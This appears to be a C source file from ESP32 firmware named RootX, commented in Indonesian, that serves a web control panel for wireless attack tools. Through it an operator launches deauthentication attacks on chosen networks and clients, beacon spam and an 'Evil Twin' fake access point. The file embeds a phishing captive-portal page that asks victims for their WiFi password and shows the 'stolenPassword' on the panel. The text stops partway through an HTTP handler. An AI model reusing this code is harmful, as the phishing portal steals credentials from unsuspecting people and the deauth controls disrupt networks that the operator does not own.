/*
 * display_system.c  –  Web UI Edition
 * Semua tampilan ST7789 diganti WiFi Hotspot + HTTP Web Interface
 * ST7789 includes TETAP ada biar linker ga error
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <math.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <dirent.h>
#include <sys/unistd.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_timer.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_http_server.h"
#include "esp_system.h"
#include "esp_random.h"
#include "driver/ledc.h"
#include "driver/gpio.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "globals.h"
#include "iconSmall.h"
#include "iconmenu.h"

/* FontxFile masih dideklarasi biar file lain yg include globals.h ga error */
FontxFile fx16G[2];
FontxFile fx24G[2];
FontxFile fx32G[2];

/* Forward declarations ─ definisi ada di bawah / file lain */
extern void handleJoystick(void);   /* input_system.c */
int sdState       = 0;              /* SD Manager state – dipakai handle_cmd */
int sdActionIdx   = 0;

static const char *TAG = "WebUI";

/* Flag AP aktif – dicek wifi_system.c biar ga dimatiin pas idle */
bool webApRunning = false;

/* ============================================================
 * HTML PAGE  –  full single-page app, stored in flash
 * ============================================================ */
static const char HTML_HEAD[] =
"<!DOCTYPE html><html lang='id'><head>"
"<meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>RootX</title>"
"<style>"
"*{margin:0;padding:0;box-sizing:border-box}"
"body{background:#050505;color:#eee;font-family:monospace;min-height:100vh}"
".hdr{background:#111;border-bottom:1px solid #222;padding:8px 12px;"
"display:flex;align-items:center;justify-content:space-between;"
"position:sticky;top:0;z-index:9}"
".logo{color:#ff1e5a;font-size:16px;font-weight:bold}"
".bat{font-size:11px;color:#888}"
".nav{background:#0a0a0a;border-bottom:1px solid #1a1a1a;padding:6px 8px;"
"display:flex;gap:4px;overflow-x:auto}"
".nav button{background:#1a1a1a;border:1px solid #222;color:#666;"
"padding:5px 10px;border-radius:4px;cursor:pointer;font-family:monospace;"
"font-size:11px;white-space:nowrap}"
".nav button.act{background:#1e2d4a;color:#eee;border-color:#4a7cf7}"
".ct{padding:10px;max-width:480px;margin:0 auto}"
".card{background:#0f0f0f;border:1px solid #1e1e1e;border-radius:6px;"
"padding:10px;margin-bottom:10px}"
".ctitle{color:#ff1e5a;font-size:12px;font-weight:bold;margin-bottom:8px;"
"padding-bottom:4px;border-bottom:1px solid #1e1e1e}"
".row{display:flex;justify-content:space-between;align-items:center;"
"padding:7px 6px;border-bottom:1px solid #111;cursor:pointer}"
".row:hover,.row.act{background:#1a2540}"
".rl{font-size:12px;color:#ccc}"
".rm{font-size:11px;color:#666}"
".br{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}"
".btn{padding:6px 14px;border:1px solid #333;border-radius:4px;cursor:pointer;"
"font-family:monospace;font-size:12px;background:#1a1a1a;color:#ccc}"
".btn:hover{background:#222}"
".bp{background:#1a2a4a;color:#4a9cf7;border-color:#2a4a7a}"
".bd{background:#2a1a1a;color:#ff6b6b;border-color:#5a2a2a}"
".bw{background:#2a2a1a;color:#ffdd6b;border-color:#5a5a2a}"
".kv{display:flex;gap:4px;padding:3px 0;font-size:12px}"
".k{color:#666;min-width:76px}"
".v{color:#ccc}.vb{color:#4a7cf7}.vg{color:#6bff6b}"
".pb{background:#0a0a0a;border:1px solid #222;border-radius:3px;"
"height:8px;margin:8px 0;overflow:hidden}"
".pf{height:100%;min-width:0;transition:width .3s}"
".pf-b{background:#4a7cf7}"
".pf-r{background:#ff6b6b}"
".pf-y{background:#ffdd6b}"
".inf{font-size:11px;color:#555;text-align:center;margin-top:6px}"
".blink{animation:bl 1s infinite}"
"@keyframes bl{0%,100%{opacity:1}50%{opacity:.3}}"
".bdg{display:inline-block;padding:1px 5px;border-radius:3px;"
"font-size:10px;background:#1a2540;color:#4a7cf7}"
".bdgr{background:#2a1a1a;color:#ff6b6b}"
".bdgg{background:#1a2a1a;color:#6bff6b}"
".empty{color:#444;text-align:center;padding:20px;font-size:12px}"
".warn{color:#ff6b6b;font-size:11px;margin:6px 0}"
"</style></head><body>"
"<div class='hdr'><span class='logo'>&lt;RootX&gt;</span>"
"<span class='bat' id='bat'>BAT:--</span></div>"
"<div class='nav'>"
"<button id='mn0' onclick='goMenu(0)'>📡 WiFi</button>"
"<button id='mn1' onclick='goMenu(1)'>📶 BLE</button>"
"<button id='mn2' onclick='goMenu(2)'>📺 IR</button>"
"<button id='mn3' onclick='goMenu(3)'>⚙ Sets</button>"
"</div>"
"<div class='ct' id='root'><div class='empty blink'>Connecting...</div></div>";

static const char HTML_SCRIPT[] =
"<script>"
"let S={};"
/* ── Core API ── */
"async function ap(path,body){"
"try{"
"const r=await fetch(path,body?{method:'POST',"
"headers:{'Content-Type':'application/json'},"
"body:JSON.stringify(body)}:{});"
"return r.ok?await r.json():null;"
"}catch{return null;}}"
"async function poll(){const d=await ap('/api/state');if(d){S=d;ren();}}"
"async function cmd(data){await ap('/api/cmd',data);await poll();}"
/* ── Wrapper commands ── */
"function goMenu(m){cmd({action:'enter_menu',menu:m});}"
"function selSub(i){cmd({action:'select_sub',sub:i});}"
"function back(){cmd({action:'go_back'});}"
"function scanStart(){cmd({action:'scan_start'});}"
"function selWifi(i){cmd({action:'select_wifi',idx:i});}"
"function showAct(){cmd({action:'show_actions'});}"
"function backList(){cmd({action:'back_to_list'});}"
"function backDet(){cmd({action:'back_to_detail'});}"
"function deauthMode(){cmd({action:'start_deauth'});}"
"function deauthGo(){cmd({action:'deauth_start'});}"
"function deauthStop(){cmd({action:'deauth_stop'});}"
"function dstaStop(){cmd({action:'deauth_sta_stop'});}"
"function spamGo(){cmd({action:'spam_start'});}"
"function spamStop(){cmd({action:'spam_stop'});}"
"function staMode(){cmd({action:'start_station_scan'});}"
"function staScan(){cmd({action:'scan_sta_start'});}"
"function selSta(i){cmd({action:'select_station',idx:i});}"
"function trackMode(){cmd({action:'start_track'});}"
"function etMode(){cmd({action:'start_evil_twin'});}"
"function etGo(){cmd({action:'evil_twin_start'});}"
"function etStop(){cmd({action:'evil_twin_stop'});}"
"function irGo(){cmd({action:'ir_start'});}"
"function irStop(){cmd({action:'ir_stop'});}"
"function tvbGo(r){cmd({action:'tvbgone_start',region:r});}"
"function tvbStop(){cmd({action:'tvbgone_stop'});}"
"function doReboot(){if(confirm('Yakin reboot ESP32?'))cmd({action:'reboot'});}"
/* ── Helpers ── */
"function esc(s){return s?s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'):''}"
"function pb(pct,cls){return \"<div class='pb'><div class='pf \"+cls+\"' style='width:\"+pct+\"%'></div></div>\";}"
"function bb(cl,txt,fn){return \"<button class='btn \"+cl+\"' onclick='\"+fn+\"'>\"+txt+\"</button>\";}"
"function bdg(t,cl){return \"<span class='bdg \"+cl+\"'>\"+t+\"</span>\";}"
/* ── Main render ── */
"function ren(){"
"document.getElementById('bat').textContent='BAT:'+(S.batteryPercent||0)+'%';"
"[0,1,2,3].forEach(i=>{"
"const b=document.getElementById('mn'+i);"
"if(b)b.className=(S.currentMenu===i&&S.appMode===0&&S.inSubMenu)?'act':'';});"
"const r=document.getElementById('root');"
"const m=S.appMode||0;"
"if(m===0&&!S.inSubMenu)r.innerHTML=pgMain();"
"else if(m===0&&S.inSubMenu)r.innerHTML=pgSub();"
"else if(m===1)r.innerHTML=pgWifi();"
"else if(m===2)r.innerHTML=pgDeauth();"
"else if(m===4)r.innerHTML=pgSpam();"
"else if(m===5)r.innerHTML=pgSta();"
"else if(m===6)r.innerHTML=pgTrack();"
"else if(m===7)r.innerHTML=pgDSta();"
"else if(m===8)r.innerHTML=pgET();"
"else if(m===9)r.innerHTML=pgIR();"
"else if(m===10)r.innerHTML=pgIRSaved();"
"else if(m===14)r.innerHTML=pgAbout();"
"else if(m===15)r.innerHTML=pgReboot();"
"else if(m===16)r.innerHTML=pgSD();"
"else if(m===18)r.innerHTML=pgTvb();"
"else r.innerHTML=\"<div class='card'><div class='empty'>Mode \"+m+\"</div></div>\";}"
/* ── Pages ── */
"function pgMain(){"
"const cats=['📡 WiFi','📶 BLE','📺 IR','⚙ Settings'];"
"let h=\"<div class='card'><div class='ctitle'>Main Menu</div>\";"
"cats.forEach((c,i)=>h+=\"<div class='row\"+(S.currentMenu===i?' act':'')+\"' onclick='goMenu(\"+i+\")'><span class='rl'>\"+c+\"</span><span class='rm'>▶</span></div>\");"
"return h+'</div>';}"
"function pgSub(){"
"const L=[['Scan WiFi','List Scan','Beacon Spam','RickRoll SSID'],"
"['BLE Scanner','Spam Apple','Spam Android'],"
"['Read IR','TV B-Gone','AC Remote','Brute Force','Saved Remotes'],"
"['Brightness','SD Manager','About RootX','Reboot']];"
"const C=['📡 WiFi','📶 BLE','📺 IR','⚙ Settings'];"
"const m=S.currentMenu||0;const list=L[m]||[];"
"let h=\"<div class='card'><div class='ctitle'>>\"+C[m]+\"</div>\";"
"list.forEach((s,i)=>h+=\"<div class='row\"+(S.currentSub===i?' act':'')+\"' onclick='selSub(\"+i+\")'><span class='rl'>\"+s+\"</span><span class='rm'>▶</span></div>\");"
"h+=\"<div class='br'>\"+bb('','◀ Back','back()')+\"</div></div>\";"
"return h;}"
"function pgWifi(){"
"const t=S.target||{};let h=\"<div class='card'>\";const ss=S.scannerState||0;"
"if(ss===0){h+=\"<div class='ctitle'>WiFi Scanner</div><p class='inf' style='padding:12px'>Mulai scan?</p><div class='br'>\"+bb('bp','🔍 Scan','scanStart()')+' '+bb('','◀ Back','back()')+\"</div>\";}"
"else if(ss===1){const p=(Date.now()/30)%100;"
"h+=\"<div class='ctitle'>Scanning... <span class='blink'>●</span></div>\"+pb(p,'pf-b')+\"<div class='inf'>Ditemukan: \"+S.totalWiFi+\" jaringan</div><div class='br'>\"+bb('bd','⏹ Batal','back()')+\"</div>\";}"
"else if(ss===2){h+=\"<div class='ctitle'>WiFi List \"+bdg(S.totalWiFi,'')+\"</div>\";"
"const wl=S.wifiList||[];"
"if(wl.length)wl.forEach((w,i)=>h+=\"<div class='row' onclick='selWifi(\"+i+\")'><div><div class='rl'>\"+(w.open?'🔓':'🔒')+' '+esc(w.ssid)+\"</div><div class='rm'>CH\"+w.channel+' | '+w.rssi+\"dBm | \"+esc(w.mac)+\"</div></div><span class='rm'>▶</span></div>\");"
"else h+=\"<div class='empty'>Kosong – scan dulu</div>\";"
"h+=\"<div class='br'>\"+bb('bp','🔄 Rescan','scanStart()')+' '+bb('','◀ Back','back()')+\"</div>\";}"
"else if(ss===3){h+=\"<div class='ctitle'>Detail: \"+esc(t.ssid)+\"</div><div class='kv'><span class='k'>SSID</span><span class='vb'>\"+esc(t.ssid)+\"</span></div><div class='kv'><span class='k'>MAC</span><span class='v'>\"+esc(t.mac)+\"</span></div><div class='kv'><span class='k'>Channel</span><span class='v'>\"+t.channel+\"</span></div><div class='kv'><span class='k'>RSSI</span><span class='v'>\"+t.rssi+\" dBm</span></div><div class='br'>\"+bb('bd','⚡ Actions','showAct()')+' '+bb('','◀ Back','backList()')+\"</div>\";}"
"else if(ss===4){h+=\"<div class='ctitle'>Actions: \"+esc(t.ssid)+\"</div>\""
"+\"<div class='row' onclick='deauthMode()'><span class='rl'>💀 Deauth</span><span class='rm'>▶</span></div>\""
"+\"<div class='row' onclick='etMode()'><span class='rl'>👥 Evil Twin</span><span class='rm'>▶</span></div>\""
"+\"<div class='row' onclick='staMode()'><span class='rl'>🔍 Scan Clients</span><span class='rm'>▶</span></div>\""
"+\"<div class='row' onclick='trackMode()'><span class='rl'>📡 Track RSSI</span><span class='rm'>▶</span></div>\""
"+\"<div class='br'>\"+bb('','◀ Back','backDet()')+\"</div>\";}"
"return h+'</div>';}"
"function pgDeauth(){"
"const t=S.target||{};let h=\"<div class='card'>\";"
"if((S.deauthState||0)===0){"
"h+=\"<div class='ctitle'>💀 Deauth Attack</div><div class='kv'><span class='k'>Target</span><span class='vb'>\"+esc(t.ssid)+\"</span></div><div class='kv'><span class='k'>Channel</span><span class='v'>\"+t.channel+\"</span></div><p class='warn'>⚠ Gunakan dgn tanggung jawab!</p><div class='br'>\"+bb('bd','💀 Serang!','deauthGo()')+' '+bb('','◀ Tidak','back()')+\"</div>\";}"
"else{const p=(Date.now()/30)%100;"
"h+=\"<div class='ctitle'>💀 Deauth \"+bdg('AKTIF','bdgr')+\"</div><div class='kv'><span class='k'>Target</span><span class='vb'>\"+esc(t.ssid)+\"</span></div><div class='kv'><span class='k'>Channel</span><span class='v'>\"+t.channel+\"</span></div>\"+pb(p,'pf-r')+\"<div class='br'>\"+bb('bd','⏹ Hentikan','deauthStop()')+\"</div>\";}"
"return h+'</div>';}"
"function pgSpam(){"
"const title=(S.aktifModeSpam||1)===2?'RickRoll SSID':'Beacon Spam';"
"let h=\"<div class='card'><div class='ctitle'>📡 \"+title+\"</div>\";"
"if((S.spamState||0)===0)h+=\"<p class='inf' style='padding:8px'>Broadcast SSID palsu?</p><div class='br'>\"+bb('bw','📡 Spam!','spamGo()')+' '+bb('','◀ Tidak','back()')+\"</div>\";"
"else{const p=(Date.now()/30)%100;h+=bdg('AKTIF','bdgr')+pb(p,'pf-y')+\"<div class='br'>\"+bb('bw','⏹ Stop','spamStop()')+\"</div>\";}"
"return h+'</div>';}"
"function pgSta(){"
"const t=S.target||{};let h=\"<div class='card'>\";const s=S.scannerStateSta||0;"
"if(s===0)h+=\"<div class='ctitle'>Station Scanner</div><p class='inf' style='padding:8px'>Scan clients di \"+esc(t.ssid||'target')+\"?</p><div class='br'>\"+bb('bp','🔍 Scan','staScan()')+' '+bb('','◀ Back','back()')+\"</div>\";"
"else if(s===1){const p=(Date.now()/30)%100;h+=\"<div class='ctitle blink'>Sniffing...</div>\"+pb(p,'pf-b')+\"<div class='br'>\"+bb('bd','⏹ Batal','back()')+\"</div>\";}"
"else if(s===2){h+=\"<div class='ctitle'>Clients \"+bdg(S.totalStation||0,'')+\"</div>\";"
"const sl=S.stationList||[];"
"if(sl.length)sl.forEach((s,i)=>{const mac=(s.mac||[]).map(b=>(b||0).toString(16).padStart(2,'0')).join(':');h+=\"<div class='row' onclick='selSta(\"+i+\")'><span class='rl' style='font-size:11px'>\"+mac+\"</span><span class='rm'>\"+s.rssi+\"dBm ▶</span></div>\";});"
"else h+=\"<div class='empty'>No clients found</div>\";"
"h+=\"<div class='br'>\"+bb('bp','🔄 Rescan','staScan()')+' '+bb('','◀ Back','back()')+\"</div>\";}"
"return h+'</div>';}"
"function pgTrack(){"
"const t=S.target||{};const rssi=t.rssi||0;"
"const pct=Math.max(0,Math.min(100,(rssi+100)*2));"
"return \"<div class='card'><div class='ctitle'>📡 Track: \"+esc(t.ssid)+\"</div><div style='text-align:center;font-size:40px;color:#eee;margin:10px 0'>\"+rssi+\"</div><div class='inf'>dBm</div>\"+pb(pct,'pf-b')+\"<div class='br'>\"+bb('','◀ Back','back()')+\"</div></div>\";}"
"function pgDSta(){"
"const st=S.targetSta||{mac:[0,0,0,0,0,0]};const p=(Date.now()/30)%100;"
"const mac=(st.mac||[]).map(b=>(b||0).toString(16).padStart(2,'0')).join(':');"
"return \"<div class='card'><div class='ctitle'>💀 Deauth STA \"+bdg('AKTIF','bdgr')+\"</div><div class='kv'><span class='k'>MAC</span><span class='v'>\"+mac+\"</span></div><div class='kv'><span class='k'>Channel</span><span class='v'>\"+((S.target||{}).channel||0)+\"</span></div>\"+pb(p,'pf-r')+\"<div class='br'>\"+bb('bd','⏹ Stop','dstaStop()')+\"</div></div>\";}"
"function pgET(){"
"const t=S.target||{};let h=\"<div class='card'>\";const es=S.evilTwinState||0;"
"if(es===0)h+=\"<div class='ctitle'>👥 Evil Twin</div><div class='kv'><span class='k'>Target</span><span class='vb'>\"+esc(t.ssid)+\"</span></div><p class='warn'>⚠ AP palsu dgn nama target!</p><div class='br'>\"+bb('bd','👥 Mulai!','etGo()')+' '+bb('','◀ Tidak','back()')+\"</div>\";"
"else if(es===1){const d='.'.repeat((Math.floor(Date.now()/400)%3)+1);h+=\"<div class='ctitle'>👥 Evil Twin \"+bdg('AKTIF','bdgr')+\"</div><p class='blink' style='color:#4a7cf7;text-align:center;margin:12px 0'>Menunggu korban\"+d+\"</p><div class='inf'>Captive portal aktif: 192.168.4.1</div><div class='br'>\"+bb('bd','⏹ Stop','etStop()')+\"</div>\";}"
"else h+=\"<div class='ctitle'>👥 Evil Twin \"+bdg('SUKSES!','bdgg')+\"</div><div class='kv'><span class='k'>Target</span><span class='vb'>\"+esc(t.ssid)+\"</span></div><div class='kv'><span class='k'>Password</span><span class='vg'>\"+esc(S.stolenPassword||'')+\"</span></div><div class='br'>\"+bb('','◀ Back','back()')+\"</div>\";"
"return h+'</div>';}"
"function pgIR(){"
"let h=\"<div class='card'><div class='ctitle'>📺 IR Sniffer</div>\";const s=S.currentIRState||0;"
"if(s===0)h+=\"<p class='inf' style='padding:8px'>Rekam sinyal IR dari remote?</p><div class='br'>\"+bb('bp','📺 Mulai Rekam','irGo()')+' '+bb('','◀ Back','back()')+\"</div>\";"
"else if(s===1)h+=\"<p class='blink' style='color:#4a7cf7;text-align:center;margin:12px 0'>Arahkan remote ke IR receiver...</p><div class='br'>\"+bb('bd','⏹ Batal','irStop()')+\"</div>\";"
"else h+=bdg('✓ TERSIMPAN','bdgg')+\"<div class='kv' style='margin-top:8px'><span class='k'>Pulses</span><span class='v'>\"+S.irPulses+\"</span></div><div class='br'>\"+bb('','◀ Back','back()')+\"</div>\";"
"return h+'</div>';}"
"function pgIRSaved(){return \"<div class='card'><div class='ctitle'>💾 Saved Remotes</div><div class='empty'>Data di /sdcard/ir_log.txt</div><div class='br'>\"+bb('','◀ Back','back()')+\"</div></div>\";}"
"function pgAbout(){return \"<div class='card'><div class='ctitle'>ℹ About ROOTX</div><div class='kv'><span class='k'>OS</span><span class='vb'>RootX</span></div><div class='kv'><span class='k'>Ver</span><span class='v'>1.0.0</span></div><div class='kv'><span class='k'>Core</span><span class='v'>ESP32-S3</span></div><div class='kv'><span class='k'>Creator</span><span class='vb'>Andyy</span></div><div class='kv'><span class='k'>UI</span><span class='v'>Web Interface</span></div><div class='kv'><span class='k'>AP</span><span class='vb'>192.168.4.1</span></div><div class='br'>\"+bb('','◀ Back','back()')+\"</div></div>\";}"
"function pgReboot(){return \"<div class='card'><div class='ctitle'>⚠ Reboot</div><p class='warn'>Reboot ESP32 sekarang?</p><div class='br'>\"+bb('bd','🔄 Reboot!','doReboot()')+' '+bb('','◀ Tidak','back()')+\"</div></div>\";}"
"function pgSD(){return \"<div class='card'><div class='ctitle'>💾 SD Manager</div><div class='br'>\"+bb('','◀ Back','back()')+\"</div></div>\";}"
"function pgTvb(){"
"let h=\"<div class='card'><div class='ctitle'>📺 TV-B-Gone</div>\";"
"if((S.tvbgoneState||0)===0){h+=\"<div class='row' onclick='tvbGo(0)'><span class='rl'>🌏 NA / ASIA</span><span class='rm'>▶</span></div><div class='row' onclick='tvbGo(1)'><span class='rl'>🌍 EUROPE</span><span class='rm'>▶</span></div><div class='row' onclick='tvbGo(2)'><span class='rl'>🌐 ALL WORLD</span><span class='rm'>▶</span></div><div class='br'>\"+bb('','◀ Back','back()')+\"</div>\";}"
"else{const tot=S.tvbgoneTotal||1;const prg=S.tvbgoneProgress||0;const pct=Math.floor(prg*100/tot);"
"h+=\"<p class='blink' style='color:#4a7cf7;text-align:center;margin:8px 0'>Mengirim kode IR...</p>\"+pb(pct,'pf-b')+\"<div class='inf'>Code: \"+prg+' / '+tot+\"</div><div class='br'>\"+bb('bd','⏹ Stop','tvbStop()')+\"</div>\";}"
"return h+'</div>';}"
"setInterval(poll,500);poll();"
"</script></body></html>";

/* ============================================================
 * CAPTIVE PORTAL HTML (Evil Twin)
 * ============================================================ */
static const char EVIL_TWIN_HTML[] =
"<html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
"<style>body{font-family:sans-serif;background:#f0f0f0;display:flex;align-items:center;"
"justify-content:center;min-height:100vh;margin:0}"
".box{background:#fff;padding:24px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.2);max-width:320px;width:90%;text-align:center}"
"h2{color:#333;margin-bottom:8px}p{color:#666;font-size:14px;margin-bottom:16px}"
"input{display:block;width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:14px}"
"button{width:100%;padding:10px;background:#007bff;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer}"
"</style></head><body><div class='box'>"
"<h2>&#128272; WiFi Update Required</h2>"
"<p>Masukkan password WiFi untuk melanjutkan koneksi.</p>"
"<form action='/login' method='POST'>"
"<input type='text' name='ssid' placeholder='Network Name' readonly>"
"<input type='password' name='pw' placeholder='Password'>"
"<button type='submit'>Connect</button></form></div></body></html>";

/* ============================================================
 * GLOBAL STATE
 * ============================================================ */
static char  state_buf[5120];
static httpd_handle_t webui_server = NULL;

/* ============================================================
 * STATE JSON BUILDER
 * ============================================================ */
static void build_state_json(void) {
    int n = 0;
    #define SB(fmt,...) n += snprintf(state_buf+n, sizeof(state_buf)-n, fmt, ##__VA_ARGS__)

    SB("{");
    SB("\"appMode\":%d,", appMode);
    SB("\"inSubMenu\":%s,", inSubMenu ? "true" : "false");
    SB("\"currentMenu\":%d,", currentMenu);
    SB("\"currentSub\":%d,", currentSub);
    SB("\"scannerState\":%d,", scannerState);
    SB("\"scannerStateSta\":%d,", scannerStateSta);
    SB("\"deauthState\":%d,", deauthState);
    SB("\"evilTwinState\":%d,", evilTwinState);
    SB("\"spamState\":%d,", spamState);
    SB("\"aktifModeSpam\":%d,", aktifModeSpam);
    SB("\"totalWiFi\":%d,", totalWiFi);
    SB("\"totalStation\":%d,", totalStation);
    SB("\"batteryPercent\":%d,", batteryPercent);
    SB("\"currentIRState\":%d,", (int)currentIRState);
    SB("\"irPulses\":%d,", last_ir_data.num_pulses);
    SB("\"tvbgoneState\":%d,", tvbgoneState);
    SB("\"tvbgoneProgress\":%d,", tvbgoneProgress);
    SB("\"tvbgoneTotal\":%d,", tvbgoneTotal);

    /* stolenPassword – escape basic chars */
    SB("\"stolenPassword\":\"");
    for (const char *p = stolenPassword; *p && n < (int)sizeof(state_buf)-4; p++) {
        if (*p == '"') { state_buf[n++]='\\'; state_buf[n++]='"'; }
        else state_buf[n++] = *p;
    }
    SB("\",");

    /* target WiFi */
    SB("\"target\":{\"ssid\":\"");
    for (const char *p = targetTerkunci.ssid; *p && n < (int)sizeof(state_buf)-8; p++) {
        if (*p == '"') { state_buf[n++]='\\'; state_buf[n++]='"'; }
        else state_buf[n++] = *p;
    }
    SB("\",\"mac\":\"%s\",\"channel\":%d,\"rssi\":%d},",
        targetTerkunci.mac, targetTerkunci.channel, targetTerkunci.rssi);

    /* target station */
    SB("\"targetSta\":{\"mac\":[%d,%d,%d,%d,%d,%d],\"rssi\":%d},",
        targetSta.mac[0], targetSta.mac[1], targetSta.mac[2],
        targetSta.mac[3], targetSta.mac[4], targetSta.mac[5],
        targetSta.rssi);

    /* WiFi list */
    SB("\"wifiList\":[");
    for (int i = 0; i < totalWiFi && i < 30 && n < (int)sizeof(state_buf)-200; i++) {
        if (i) state_buf[n++] = ',';
        SB("{\"ssid\":\"");
        for (const char *p = listWiFi[i].ssid; *p && n < (int)sizeof(state_buf)-12; p++) {
            if (*p == '"') { state_buf[n++]='\\'; state_buf[n++]='"'; }
            else state_buf[n++] = *p;
        }
        SB("\",\"mac\":\"%s\",\"channel\":%d,\"rssi\":%d,\"open\":%s}",
            listWiFi[i].mac, listWiFi[i].channel, listWiFi[i].rssi,
            listWiFi[i].is_open ? "true" : "false");
    }
    SB("],");

    /* Station list */
    SB("\"stationList\":[");
    for (int i = 0; i < totalStation && i < 30 && n < (int)sizeof(state_buf)-200; i++) {
        if (i) state_buf[n++] = ',';
        SB("{\"mac\":[%d,%d,%d,%d,%d,%d],\"rssi\":%d,\"paket\":%d}",
            listStation[i].mac[0], listStation[i].mac[1], listStation[i].mac[2],
            listStation[i].mac[3], listStation[i].mac[4], listStation[i].mac[5],
            listStation[i].rssi, listStation[i].paket_count);
    }
    SB("]}");
    if (n >= (int)sizeof(state_buf)) state_buf[sizeof(state_buf)-1] = '\0';
    #undef SB
}

/* ============================================================
 * COMMAND HANDLER
 * ============================================================ */
static int parse_int(const char *body, const char *key) {
    const char *p = strstr(body, key);
    if (!p) return -1;
    p = strchr(p, ':');
    if (!p) return -1;
    while (*p == ':' || *p == ' ') p++;
    return atoi(p);
}

static void parse_action(const char *body, char *out, int maxlen) {
    out[0] = '\0';
    const char *p = strstr(body, "\"action\"");
    if (!p) return;
    p = strchr(p, ':');
    if (!p) return;
    p = strchr(p, '"'); if (!p) return; p++;
    int i = 0;
    while (*p && *p != '"' && i < maxlen-1) out[i++] = *p++;
    out[i] = '\0';
}

static void handle_cmd(const char *body) {
    char action[48];
    parse_action(body, action, sizeof(action));

    int pidx   = parse_int(body, "\"idx\"");
    int pmenu  = parse_int(body, "\"menu\"");
    int psub   = parse_int(body, "\"sub\"");
    int pregion= parse_int(body, "\"region\"");

    if (strcmp(action, "enter_menu") == 0) {
        if (pmenu >= 0) currentMenu = pmenu;
        currentSub = 0; topMenu = 0;
        appMode = 0; inSubMenu = true;
    }
    else if (strcmp(action, "select_sub") == 0) {
        if (psub >= 0) currentSub = psub;
        inSubMenu = false;
        /* WiFi menu */
        if (currentMenu == 0) {
            if (currentSub == 0) { appMode = 1; scannerState = 0; }
            else if (currentSub == 1) { appMode = 1; scannerState = 2; }
            else if (currentSub == 2) { appMode = 4; aktifModeSpam = 1; spamState = 0; }
            else if (currentSub == 3) { appMode = 4; aktifModeSpam = 2; spamState = 0; }
        }
        /* IR menu */
        else if (currentMenu == 2) {
            if      (currentSub == 0) { appMode = 9;  currentIRState = IR_STATE_CONFIRM; }
            else if (currentSub == 1) { appMode = 18; tvbgoneState = 0; }
            else if (currentSub == 4) { appMode = 10; currentIRSavedState = IR_SAVED_STATE_LIST; loadSavedRemotes(); }
            else { appMode = 0; inSubMenu = true; } /* others not impl */
        }
        /* Settings menu */
        else if (currentMenu == 3) {
            if      (currentSub == 0) { appMode = 3; }   /* brightness (stub) */
            else if (currentSub == 1) { appMode = 16; sdState = 0; }
            else if (currentSub == 2) { appMode = 14; }
            else if (currentSub == 3) { appMode = 15; }
        }
        else { appMode = 0; inSubMenu = true; }
    }
    else if (strcmp(action, "go_back") == 0) {
        if (appMode == 0 && inSubMenu) { inSubMenu = false; }
        else { appMode = 0; inSubMenu = true; }
    }
    else if (strcmp(action, "back_to_list")   == 0) { scannerState = 2; }
    else if (strcmp(action, "back_to_detail") == 0) { scannerState = 3; }

    /* ── WiFi Scanner ── */
    else if (strcmp(action, "scan_start") == 0) {
        triggerScan = true; scannerState = 1; scanDone = false;
    }
    else if (strcmp(action, "select_wifi") == 0) {
        if (pidx >= 0 && pidx < totalWiFi) {
            memcpy(&targetTerkunci, &listWiFi[pidx], sizeof(WiFiData));
            targetLockedIdx = pidx; adaTarget = true;
            scannerState = 3;
        }
    }
    else if (strcmp(action, "show_actions") == 0) {
        scannerState = 4; contextCursor = 0;
    }

    /* ── Deauth ── */
    else if (strcmp(action, "start_deauth") == 0) { appMode = 2; deauthState = 0; }
    else if (strcmp(action, "deauth_start") == 0) {
        deauthState = 1; isDeauthing = true; deauthUdahSetup = false;
    }
    else if (strcmp(action, "deauth_stop") == 0) {
        isDeauthing = false; deauthState = 0;
        appMode = 1; scannerState = 4;
    }

    /* ── Spam ── */
    else if (strcmp(action, "spam_start") == 0) {
        spamState = 1; isSpamming = true; spamUdahSetup = false;
    }
    else if (strcmp(action, "spam_stop") == 0) { isSpamming = false; spamState = 0; }

    /* ── Station Scanner ── */
    else if (strcmp(action, "start_station_scan") == 0) { appMode = 5; scannerStateSta = 0; }
    else if (strcmp(action, "scan_sta_start") == 0) {
        triggerScanSta = true; scannerStateSta = 1; scanStaDone = false;
    }
    else if (strcmp(action, "select_station") == 0) {
        if (pidx >= 0 && pidx < totalStation) {
            memcpy(&targetSta, &listStation[pidx], sizeof(StationInfo));
            adaTargetSta = true; scannerStateSta = 3;
        }
    }

    /* ── Track ── */
    else if (strcmp(action, "start_track") == 0) { appMode = 6; triggerTrack = true; }

    /* ── Evil Twin ── */
    else if (strcmp(action, "start_evil_twin") == 0) { appMode = 8; evilTwinState = 0; }
    else if (strcmp(action, "evil_twin_start") == 0) {
        evilTwinState = 1; triggerEvilTwin = true;
    }
    else if (strcmp(action, "evil_twin_stop") == 0) {
        triggerEvilTwin = false; isEvilTwin = false;
        evilTwinState = 0; appMode = 1; scannerState = 4;
    }

    /* ── IR ── */
    else if (strcmp(action, "ir_start") == 0) {
        currentIRState = IR_STATE_WAITING; triggerReadIR = true;
    }
    else if (strcmp(action, "ir_stop") == 0) {
        currentIRState = IR_STATE_CONFIRM; triggerReadIR = false;
    }

    /* ── TV-B-Gone ── */
    else if (strcmp(action, "tvbgone_start") == 0) {
        tvbgoneState = 1;
        tvbgoneMenuIdx = (pregion >= 0) ? pregion : 0;
        tvbgoneProgress = 0;
    }
    else if (strcmp(action, "tvbgone_stop") == 0) { tvbgoneState = 0; }

    /* ── Deauth STA ── */
    else if (strcmp(action, "deauth_sta_stop") == 0) {
        isDeauthSta = false; appMode = 5; scannerStateSta = 4;
    }

    /* ── Reboot ── */
    else if (strcmp(action, "reboot") == 0) {
        vTaskDelay(pdMS_TO_TICKS(300));
        esp_restart();
    }
}

/* ============================================================
 * HTTP HANDLERS
 * ============================================================ */

/* Root: serve web UI atau evil twin portal */
static esp_err_t handler_root(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
